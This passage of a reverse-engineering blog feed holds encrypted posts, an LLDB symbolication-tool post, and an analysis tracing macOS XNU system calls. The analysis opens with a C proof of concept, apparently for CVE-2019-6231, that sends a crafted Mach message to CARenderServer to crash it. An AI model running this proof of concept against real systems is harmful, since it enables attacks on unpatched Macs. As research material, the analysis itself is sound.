cEicxNFaqo7tI2QxMjXkBewi1yQWiRxRoW+dIYzct4fo2QKaWexGwgcFNCydYVoGMHoXlnS+6uRjSbs3KGIrMCRaKifkNJOdrT0lvnquZXABT5/1jgx0efocLLYatGZXDh+nGDMLciIpIVCeU3oEeCIR09rVTp4GTNr0TcuJ+trSbNvH4aCRhT2+Qdv1/1k6rVBosy7hucMJZfOShYomd4Oq41xpoZtX1YnkQvcxGsQTPoYKdmTf2dGhLcuL6qsknTwCg6RiKMBJMsllUvq/HO9EQzOf8jWWVcRzER36U1K2Sk1bIFER9ThcaqE1wA6uCOjtg4L3QKmfW3+FQK</div><script src="/lib/crypto-js.js"></script><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      something you can not kown 
    
    </summary>
    
      <category term="IDA" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/IDA/"/>
    
    
  </entry>
  
  <entry>
    <title>1amb4ck</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2019/03/05/1amb4ck/1amb4ck/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2019/03/05/1amb4ck/1amb4ck/</id>
    <published>2019-03-05T15:26:30.000Z</published>
    <updated>2019-03-06T02:47:23.041Z</updated>
    
    <content type="html"><![CDATA[<script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script><div id="hbe-security">  <div class="hbe-input-container">  <input type="password" class="hbe-form-control" id="pass" placeholder="Need password to decrypt!" />    <label for="pass">Need password to decrypt!</label>    <div class="bottom-line"></div>  </div></div><div id="decryptionError" style="display: none;">Incorrect Password!</div><div id="noContentError" style="display: none;">No content to display!</div><div id="encrypt-blog" style="display:none">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</div><script src="/lib/crypto-js.js"></script><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      Welcome to my blog, enter password to read.
    
    </summary>
    
      <category term="me" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/me/"/>
    
    
  </entry>
  
  <entry>
    <title>XNU系统调用深度解析</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2019/01/30/XNU%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8%E6%B7%B1%E5%BA%A6%E8%A7%A3%E6%9E%90/XNU%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8%E6%B7%B1%E5%BA%A6%E8%A7%A3%E6%9E%90/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2019/01/30/XNU系统调用深度解析/XNU系统调用深度解析/</id>
    <published>2019-01-30T05:53:00.000Z</published>
    <updated>2019-03-05T15:30:52.474Z</updated>
    
    <content type="html"><![CDATA[<h3 id="XNU系统调用深度解析"><a href="#XNU系统调用深度解析" class="headerlink" title="XNU系统调用深度解析"></a>XNU系统调用深度解析</h3><blockquote><p>从一个函数分析到系统调用的内核实现</p></blockquote><h4 id="由一段POC而起"><a href="#由一段POC而起" class="headerlink" title="由一段POC而起"></a>由一段POC而起</h4><pre><code class="c">#include &lt;stdio.h&gt;#include &lt;mach/i386/kern_return.h&gt;#include &lt;mach/mach_traps.h&gt;#include &lt;servers/bootstrap.h&gt;#include &lt;dirent.h&gt;#include &lt;sys/stat.h&gt;#include &lt;time.h&gt;#include &lt;dlfcn.h&gt;#include &lt;unistd.h&gt;typedef struct quartz_register_client_s quartz_register_client_t;struct quartz_register_client_s {        mach_msg_header_t header;        uint32_t body;        mach_msg_port_descriptor_t ports[4];        char padding[12];};typedef struct quartzcore_mach_msg quartzcore_mach_msg_t;struct quartzcore_mach_msg{        mach_msg_header_t header;        char msg_body[712];};uint64_t get_filesize(const char *fn){        struct stat st;        stat(fn, &amp;st);        uint64_t fsize = st.st_size;        return fsize;};int main(int argc, const char * argv[]) {        mach_port_t p = MACH_PORT_NULL, bs_port = MACH_PORT_NULL;        task_get_bootstrap_port(mach_task_self(), &amp;bs_port);        const char *render_service_name = &quot;com.apple.CARenderServer&quot;;        kern_return_t (*bootstrap_look_up)(mach_port_t, const char *, mach_port_t *) = dlsym(RTLD_DEFAULT, &quot;bootstrap_look_up&quot;);        kern_return_t kr = bootstrap_look_up(bs_port, render_service_name, &amp;p);        if (kr != KERN_SUCCESS) {                return -1;        }        printf(&quot;[*] Get service of %s successully!\n&quot;, render_service_name);        quartz_register_client_t msg_register;        memset(&amp;msg_register, 0, sizeof(msg_register));        msg_register.header.msgh_bits =        MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, MACH_MSG_TYPE_MAKE_SEND_ONCE) |        MACH_MSGH_BITS_COMPLEX;        msg_register.header.msgh_remote_port = p;        msg_register.header.msgh_local_port = mig_get_reply_port();        msg_register.header.msgh_id = 40202;  // _XRegisterClient        msg_register.body = 4;        msg_register.ports[0].name = mach_task_self();        msg_register.ports[0].disposition = MACH_MSG_TYPE_COPY_SEND;        msg_register.ports[0].type = MACH_MSG_PORT_DESCRIPTOR;        msg_register.ports[1].name = mach_task_self();        msg_register.ports[1].disposition = MACH_MSG_TYPE_COPY_SEND;        msg_register.ports[1].type = MACH_MSG_PORT_DESCRIPTOR;        msg_register.ports[2].name = mach_task_self();        msg_register.ports[2].disposition = MACH_MSG_TYPE_COPY_SEND;        msg_register.ports[2].type = MACH_MSG_PORT_DESCRIPTOR;        msg_register.ports[3].name = mach_task_self();        msg_register.ports[3].disposition = MACH_MSG_TYPE_COPY_SEND;        msg_register.ports[3].type = MACH_MSG_PORT_DESCRIPTOR;        kr = mach_msg(&amp;msg_register.header, MACH_SEND_MSG | MACH_RCV_MSG,                                    sizeof(quartz_register_client_t), sizeof(quartz_register_client_t),                                    msg_register.header.msgh_local_port, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);        if (kr != KERN_SUCCESS) {                return -1 ;        }        mach_port_t context_port = *(uint32_t *)((uint8_t *)&amp;msg_register + 0x1c);        uint32_t conn_id = *(uint32_t *)((uint8_t *)&amp;msg_register + 0x30);        printf(&quot;[*] context_port: 0x%x, conn_id: 0x%x\n&quot;,context_port,conn_id);        char *crash_log = &quot;crash.data&quot;; //size is 736.        FILE *fp = fopen(crash_log, &quot;rb&quot;);        if(fp == NULL){                printf(&quot;fopen error!\n&quot;);        }        uint64_t fsize = get_filesize(crash_log);        void *msg_buf = malloc(fsize);        memset(msg_buf, 0, fsize);        fread(msg_buf, fsize, 1, fp);        quartzcore_mach_msg_t qc_mach_msg = {0};        qc_mach_msg.header.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, 0) | MACH_MSGH_BITS_COMPLEX;        qc_mach_msg.header.msgh_remote_port = context_port;        qc_mach_msg.header.msgh_id = 40002;        memset(qc_mach_msg.msg_body, 0x0, sizeof(qc_mach_msg.msg_body));        *(uint32_t *)(qc_mach_msg.msg_body + 0) = 0x1;  // Ports count        memcpy(qc_mach_msg.msg_body+4+12, msg_buf+0x1c+0xc, 736-0x1c-0xc);        *(uint32_t *)(qc_mach_msg.msg_body + 4 + 12 + 4) = conn_id;        kr = mach_msg(&amp;qc_mach_msg.header, MACH_SEND_MSG,736, 0, 0, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);        if (kr != KERN_SUCCESS) {                printf(&quot;[-] Send message failed: 0x%d\n&quot;, kr);                return -1 ;        }        return 0;}</code></pre><p>里面的macho函数<code>mach_msg()</code>到底后面执行到哪里？于是展开一段追踪</p><p>从ida的导入表中可以看到这个函数实现在libSystem.B.dylib 顺便说下，这个动态库实际上只是一层封装，里面导入了/usr/lib/system下面的动态库。</p><pre><code class="assembly">* thread #1, queue = &#39;com.apple.main-thread&#39;, stop reason = breakpoint 2.1    frame #0: 0x00007fff79299694 libsystem_kernel.dylib`mach_msglibsystem_kernel.dylib`mach_msg:-&gt;  0x7fff79299694 &lt;+0&gt;: pushq  %rbp    0x7fff79299695 &lt;+1&gt;: movq   %rsp, %rbp    0x7fff79299698 &lt;+4&gt;: pushq  %r15    0x7fff7929969a &lt;+6&gt;: pushq  %r14Target 0: (CVE-2019-6231-poc) stopped.</code></pre><p>调试可以看出mach_msg实现在libsystem_kernel.dylib之中</p><pre><code class="assembly">(lldb) dislibsystem_kernel.dylib`mach_msg:-&gt;  0x7fff79299694 &lt;+0&gt;:   pushq  %rbp    0x7fff79299695 &lt;+1&gt;:   movq   %rsp, %rbp    0x7fff79299698 &lt;+4&gt;:   pushq  %r15    0x7fff7929969a &lt;+6&gt;:   pushq  %r14    0x7fff7929969c &lt;+8&gt;:   pushq  %r13    0x7fff7929969e &lt;+10&gt;:  pushq  %r12    0x7fff792996a0 &lt;+12&gt;:  pushq  %rbx    0x7fff792996a1 &lt;+13&gt;:  subq   $0x28, %rsp    0x7fff792996a5 &lt;+17&gt;:  movl   %ecx, %r13d    0x7fff792996a8 &lt;+20&gt;:  movl   %esi, %ebx    0x7fff792996aa &lt;+22&gt;:  movq   %rdi, %r14    0x7fff792996ad &lt;+25&gt;:  movl   0x10(%rbp), %eax    0x7fff792996b0 &lt;+28&gt;:  movl   %ebx, %r12d    0x7fff792996b3 &lt;+31&gt;:  andl   $0xfffffbbf, %r12d        ; imm = 0xFFFFFBBF     0x7fff792996ba &lt;+38&gt;:  movl   %eax, (%rsp)    0x7fff792996bd &lt;+41&gt;:  movl   %r12d, %esi    0x7fff792996c0 &lt;+44&gt;:  movl   %edx, %r15d    0x7fff792996c3 &lt;+47&gt;:  movl   %r8d, -0x2c(%rbp)    0x7fff792996c7 &lt;+51&gt;:  movl   %r9d, -0x30(%rbp)    0x7fff792996cb &lt;+55&gt;:  callq  0x7fff79299170            ; mach_msg_trap    ...</code></pre><pre><code class="c">mach_msg_return_t __cdecl mach_msg(mach_msg_header_t *msg, mach_msg_option_t option, mach_msg_size_t send_size, mach_msg_size_t rcv_size, mach_port_name_t rcv_name, mach_msg_timeout_t timeout, mach_port_name_t notify){  mach_msg_return_t result; // eax  mach_msg_option_t v8; // er12  result = mach_msg_trap();  if ( !result )    return 0;  if ( !(option &amp; 0x40) &amp;&amp; result == 268435463 )  {    do      result = mach_msg_trap();    while ( result == 268435463 );  }  v8 = option;  if ( !_bittest(&amp;v8, 0xAu) &amp;&amp; result == 268451845 )  {    do      result = mach_msg_trap();    while ( result == 268451845 );  }  return result;}</code></pre><p>通过调式和ida反汇编mach_msg函数可以看出，最终会调用mach_msg_trap这个函数，再跟一下</p><pre><code class="assembly">* thread #1, queue = &#39;com.apple.main-thread&#39;, stop reason = breakpoint 3.1    frame #0: 0x00007fff79299170 libsystem_kernel.dylib`mach_msg_traplibsystem_kernel.dylib`mach_msg_trap:-&gt;  0x7fff79299170 &lt;+0&gt;:  movq   %rcx, %r10    0x7fff79299173 &lt;+3&gt;:  movl   $0x100001f, %eax          ; imm = 0x100001F     0x7fff79299178 &lt;+8&gt;:  syscall     0x7fff7929917a &lt;+10&gt;: retq   Target 0: (CVE-2019-6231-poc) stopped.</code></pre><p>这个函数后面会调用0x100001f系统调用，可以小结得到系统库封装了最底层的实现，最终通过系统调用进入内核。在用户层到这里已经就到头了，无法再跟进。</p><h4 id="XNU内核系统调用流程"><a href="#XNU内核系统调用流程" class="headerlink" title="XNU内核系统调用流程"></a>XNU内核系统调用流程</h4><p>系统调用发生在内核之中，那么最开始处理系统调用的地方又在哪？通过<a href="http://www.intel.com/content/www/us/en/processors/architectures-software-developer-manuals.html" target="_blank" rel="external">intel官方文档</a>可以找到</p><pre><code>SYSCALL invokes an OS system-call handler at privilege level 0.It does so by loading RIP from the IA32_LSTAR MSR</code></pre><p>也就是内核需要将系统调用处理函数入口放到<code>IA32_LSTAR</code> <a href="https://en.wikipedia.org/wiki/Model-specific_register" target="_blank" rel="external">model specific register</a>. 在内核源码中对应在<code>osfmk/i386/mp_desc.c</code>的<code>cpu_syscall_init(cpu_data_t *cdp)</code>函数之中</p><pre><code class="c">/* * Set MSRs for sysenter/sysexit and syscall/sysret for 64-bit. */voidcpu_syscall_init(cpu_data_t *cdp){#if MONOTONIC    mt_cpu_up(cdp);#else /* MONOTONIC */#pragma unused(cdp)#endif /* !MONOTONIC */    wrmsr64(MSR_IA32_SYSENTER_CS, SYSENTER_CS);     wrmsr64(MSR_IA32_SYSENTER_EIP, DBLMAP((uintptr_t) hi64_sysenter));    wrmsr64(MSR_IA32_SYSENTER_ESP, current_cpu_datap()-&gt;cpu_desc_index.cdi_sstku);    /* Enable syscall/sysret */    wrmsr64(MSR_IA32_EFER, rdmsr64(MSR_IA32_EFER) | MSR_IA32_EFER_SCE);    /*     * MSRs for 64-bit syscall/sysret     * Note USER_CS because sysret uses this + 16 when returning to     * 64-bit code.     */    wrmsr64(MSR_IA32_LSTAR, DBLMAP((uintptr_t) hi64_syscall));    wrmsr64(MSR_IA32_STAR, (((uint64_t)USER_CS) &lt;&lt; 48) | (((uint64_t)KERNEL64_CS) &lt;&lt; 32));    /*     * Emulate eflags cleared by sysenter but note that     * we also clear the trace trap to avoid the complications     * of single-stepping into a syscall. The nested task bit     * is also cleared to avoid a spurious &quot;task switch&quot;     * should we choose to return via an IRET.     */    wrmsr64(MSR_IA32_FMASK, EFL_DF|EFL_IF|EFL_TF|EFL_NT);}</code></pre><p><code>wrmsr64(MSR_IA32_LSTAR, DBLMAP((uintptr_t) hi64_syscall));</code>也就是系统调用会由<code>hi64_syscall</code>函数处理。这个函数实现在<code>xnu/osfmk/x86_64/idt64.s</code>之中</p><pre><code class="assembly">Entry(hi64_syscall)Entry(idt64_syscall)    swapgs     /* Use RAX as a temporary by shifting its contents into R11[32:63]      * The systemcall number is defined to be a 32-bit quantity, as is      * RFLAGS.      */    shlq    $32, %rax    or     %rax, %r11.globl EXT(dblsyscall_patch_point)EXT(dblsyscall_patch_point)://    movabsq    $0x12345678ABCDEFFFULL, %rax     /* Generate offset to the double-mapped per-CPU data shadow      * into RAX      */    leaq    EXT(idt64_hndl_table0)(%rip), %rax    mov    16(%rax), %rax    mov     %rsp, %gs:CPU_UBER_TMP(%rax)  /* save user stack */    mov     %gs:CPU_ESTACK(%rax), %rsp  /* switch stack to per-cpu estack */    sub    $(ISF64_SIZE), %rsp    /*     * Synthesize an ISF frame on the exception stack     */    movl    $(USER_DS), ISF64_SS(%rsp)    mov    %rcx, ISF64_RIP(%rsp)        /* rip */    mov    %gs:CPU_UBER_TMP(%rax), %rcx    mov    %rcx, ISF64_RSP(%rsp)        /* user stack --changed */    mov    %r11, %rax    shrq    $32, %rax        /* Restore RAX */    mov    %r11d, %r11d        /* Clear r11[32:63] */    mov    %r11, ISF64_RFLAGS(%rsp)    /* rflags */    movl    $(SYSCALL_CS), ISF64_CS(%rsp)    /* cs - a pseudo-segment */    mov    %rax, ISF64_ERR(%rsp)        /* err/rax - syscall code */    movq    $(HNDL_SYSCALL), ISF64_TRAPFN(%rsp)    movq    $(T_SYSCALL), ISF64_TRAPNO(%rsp)    /* trapno */    swapgs    jmp    L_dispatch            /* this can only be 64-bit */</code></pre><p>继续跟下去，会得到如下执行流程</p><pre><code>syscall--&gt;hi64_syscall-&gt;L_dispatch--&gt;ks_dispatch--&gt;ks_dispatch_user--&gt;L_dispatch_U64--&gt;L_dispatch_64bit--&gt;L_common_dispatch--&gt;hndl_syscall</code></pre><pre><code class="assembly">/* * 64bit Tasks * System call entries via syscall only: * *    r15     x86_saved_state64_t *    rsp     kernel stack * *    both rsp and r15 are 16-byte aligned *    interrupts disabled *    direction flag cleared */Entry(hndl_syscall)    TIME_TRAP_UENTRY    movq    %gs:CPU_ACTIVE_THREAD,%rcx    /* get current thread     */    movl    $-1, TH_IOTIER_OVERRIDE(%rcx)    /* Reset IO tier override to -1 before handling syscall */    movq    TH_TASK(%rcx),%rbx        /* point to current task  */    /* Check for active vtimers in the current task */    TASK_VTIMER_CHECK(%rbx,%rcx)    /*     * We can be here either for a mach, unix machdep or diag syscall,     * as indicated by the syscall class:     */    movl    R64_RAX(%r15), %eax        /* syscall number/class */    movl    %eax, %edx    andl    $(SYSCALL_CLASS_MASK), %edx    /* syscall class */    cmpl    $(SYSCALL_CLASS_MACH&lt;&lt;SYSCALL_CLASS_SHIFT), %edx    je    EXT(hndl_mach_scall64)    cmpl    $(SYSCALL_CLASS_UNIX&lt;&lt;SYSCALL_CLASS_SHIFT), %edx    je    EXT(hndl_unix_scall64)    cmpl    $(SYSCALL_CLASS_MDEP&lt;&lt;SYSCALL_CLASS_SHIFT), %edx    je    EXT(hndl_mdep_scall64)    cmpl    $(SYSCALL_CLASS_DIAG&lt;&lt;SYSCALL_CLASS_SHIFT), %edx    je    EXT(hndl_diag_scall64)    /* Syscall class unknown */    sti    CCALL3(i386_exception, $(EXC_SYSCALL), %rax, $1)    /* no return */</code></pre><p><code>hndl_syscall</code>这个函数会系统调用分为<code>hndl_unix_scall64</code> 、<code>hndl_mach_scall64</code>、<code>hndl_mdep_scall64</code>、<code>hndl_diag_scall64</code>四类分别处理</p><p>这里以<code>hndl_unix_scall64</code>为列</p><pre><code class="assembly">Entry(hndl_unix_scall)        TIME_TRAP_UENTRY    movq    %gs:CPU_ACTIVE_THREAD,%rcx    /* get current thread     */    movq    TH_TASK(%rcx),%rbx        /* point to current task  */    incl    TH_SYSCALLS_UNIX(%rcx)        /* increment call count   */    /* Check for active vtimers in the current task */    TASK_VTIMER_CHECK(%rbx,%rcx)    sti    CCALL1(unix_syscall, %r15)    /*     * always returns through thread_exception_return     */</code></pre><p>这里调动了<code>unix_syscall</code>函数，这个函数在bsd/dev/i386/systemcalls.c之中实现，里面进行了一些权限检查</p><p>以及根据系统调用表去调用对应的实现</p><pre><code class="c">  thread = current_thread();  uthread = get_bsdthread_info(thread);  // regs is derrived from r15 ...  code = regs-&gt;rax &amp; SYSCALL_NUMBER_MASK;  callp = (code &gt;= NUM_SYSENT) ? &amp;sysent[63] : &amp;sysent[code];  // ...  vt = (void *)uthread-&gt;uu_arg;  // ...  memcpy(vt, args_start_at_rdi ? &amp;regs-&gt;rdi : &amp;regs-&gt;rsi,        args_in_regs * sizeof(syscall_arg_t));  // ...  error = (*(callp-&gt;sy_call))((void *)p, vt, &amp;(uthread-&gt;uu_rval[0]));</code></pre><p>目前执行的流程如下</p><pre><code>hi64_syscallL_dispatch_U64L_dispatch_64bitL_common_dispatchhndl_syscall // rdx, pushed in hi64_syscallhndl_unix_scall64unix_syscall64error = (*(callp-&gt;sy_call))((void *)p, vt, &amp;(uthread-&gt;uu_rval[0])); // now we&#39;re there</code></pre><h4 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h4><p><a href="https://www.binss.me/blog/interrupt-and-exception/" target="_blank" rel="external">https://www.binss.me/blog/interrupt-and-exception/</a></p><p><a href="https://0xax.gitbooks.io/linux-insides/content/SysCall/linux-syscall-2.html" target="_blank" rel="external">https://0xax.gitbooks.io/linux-insides/content/SysCall/linux-syscall-2.html</a></p><p><a href="https://gist.github.com/yrp604/23e86dce9ca12bf514ef" target="_blank" rel="external">https://gist.github.com/yrp604/23e86dce9ca12bf514ef</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;XNU系统调用深度解析&quot;&gt;&lt;a href=&quot;#XNU系统调用深度解析&quot; class=&quot;headerlink&quot; title=&quot;XNU系统调用深度解析&quot;&gt;&lt;/a&gt;XNU系统调用深度解析&lt;/h3&gt;&lt;blockquote&gt;
&lt;p&gt;从一个函数分析到系统调用的内核实现&lt;/p&gt;
      
    
    </summary>
    
      <category term="iOSRE" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/iOSRE/"/>
    
    
      <category term="XNU" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/XNU/"/>
    
      <category term="Kernel" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/Kernel/"/>
    
  </entry>
  
  <entry>
    <title>LLDB调试器栈符号化</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2018/10/03/LLDB%E8%B0%83%E8%AF%95%E5%99%A8%E6%A0%88%E7%AC%A6%E5%8F%B7%E5%8C%96/%E5%BC%BA%E5%8C%96%E4%BD%A0%E7%9A%84lldb%E8%B0%83%E8%AF%95%E5%99%A8/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2018/10/03/LLDB调试器栈符号化/强化你的lldb调试器/</id>
    <published>2018-10-03T05:27:59.000Z</published>
    <updated>2019-02-21T10:07:17.274Z</updated>
    
    <content type="html"><![CDATA[<h3 id="强化你的lldb调试器"><a href="#强化你的lldb调试器" class="headerlink" title="强化你的lldb调试器"></a>强化你的lldb调试器</h3><h3 id="Why"><a href="#Why" class="headerlink" title="Why?"></a>Why?</h3><p>lldb作为苹果iOS和macOS的调试器在正向开发中十分强大，不过对于逆向人员来说却不是很友好。尤其是那些符号表被strip以后的执行文件。去定位追溯一个函数的执行流程时，查看当前的栈帧只有一堆内存地址，如果要定位是哪个函数通常的流程就是找到当前模块的内存偏移，然后栈上的地址逐一减去改偏移然后去ida中查找改地址，最后才能定位到函数名。流程琐碎且都是重复工作，花费大量时间去定位符号信息。因此我想做一个能自动恢复栈帧符号的命令。只要输入改命令就能显示函数的调用情况。</p><h3 id="How"><a href="#How" class="headerlink" title="How?"></a>How?</h3><p>但是符号表都已经被strip了怎么才能恢复符号呢？我的想法就是macho可执行文件中其实是有很大一部分段储存的OC函数信息，里面肯定是有类名和方法名的，我们要做的就是通过栈中的地址，遍历所有的类以及方法，找到最佳的类方法即可。判断原则就是找到距离栈地址最近且小于等于栈地址的类方法。然后记录类名和方法名即可。</p><p>正好lldb提供了python的接口，可以开发自定义的命令。</p><h3 id="And-what"><a href="#And-what" class="headerlink" title="And what ?"></a>And what ?</h3><p>虽然有python接口，但是lldb里面集成了一个OC的解释器，其语法要求特别严格，按照通常开发的写法会有很多错误，经过不断的调试和修复bug，一个开发版基于lldb python栈符号恢复命令开发完成。git地址在<a href="https://github.com/4ch12dy/xia0LLDB">这里</a></p><p>这里面还有的搜索算法以及异常处理还需要优化，以及对于block这类函数还不能恢复，不过对于大多数的场景目前还是可用。具体效果可以如下：</p><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/lldb-python/b_bt.jpg?raw=true" alt="https://github.com/4ch12dy/xia0LLDB/blob/master/resource/b_bt.jpg?raw=true"></p><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/lldb-python/b_sbt.jpg?raw=true" alt="https://github.com/4ch12dy/xia0LLDB/blob/master/resource/b_sbt.jpg?raw=true"></p><h3 id="update"><a href="#update" class="headerlink" title="update"></a>update</h3><p>现已支持恢复block结构符号解析，通过提供的ida脚本，得到一个json格式的block符号文件，然后在lldb命令行中输入<code>sbt -f block-json-file-path</code>即可加载该文件。效果如下：</p><h4 id="原始的bt命令结果"><a href="#原始的bt命令结果" class="headerlink" title="原始的bt命令结果"></a>原始的bt命令结果</h4><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/lldb-python/orig_bt.png?raw=true" alt="orig_bt"></p><h4 id="sbt命令（没有加载block符号文件）"><a href="#sbt命令（没有加载block符号文件）" class="headerlink" title="sbt命令（没有加载block符号文件）"></a>sbt命令（没有加载block符号文件）</h4><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/lldb-python/sbt-noblockfile.png?raw=true" alt="sbt-noblockfile"></p><h4 id="sbt命令（带有block符号文件）"><a href="#sbt命令（带有block符号文件）" class="headerlink" title="sbt命令（带有block符号文件）"></a>sbt命令（带有block符号文件）</h4><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/lldb-python/sbt-blockfile.png?raw=true" alt="sbt-blockfile"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;强化你的lldb调试器&quot;&gt;&lt;a href=&quot;#强化你的lldb调试器&quot; class=&quot;headerlink&quot; title=&quot;强化你的lldb调试器&quot;&gt;&lt;/a&gt;强化你的lldb调试器&lt;/h3&gt;&lt;h3 id=&quot;Why&quot;&gt;&lt;a href=&quot;#Why&quot; class=&quot;he
      
    
    </summary>
    
      <category term="iOSRE" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/iOSRE/"/>
    
    
      <category term="LLDB" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/LLDB/"/>
    
      <category term="python" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/python/"/>
    
  </entry>
  
  <entry>
    <title>unicorn</title>
